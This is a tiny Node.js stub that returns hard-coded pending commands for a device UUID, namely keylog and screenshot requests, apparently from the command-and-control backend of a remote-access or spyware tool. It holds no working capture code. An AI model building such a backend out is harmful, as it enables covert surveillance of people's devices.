'use strict'

module.exports = {
    findPendingCommandsByUuid: function (uuid) {
        //Faire la requete à la base de donnée
        //SELECT commandName FROM Command WHERE uuid = :uuid AND pending = 1 (true)

        return [
            'keylogs',
            'screenshot',
            'keylogs'
        ]
    }
}
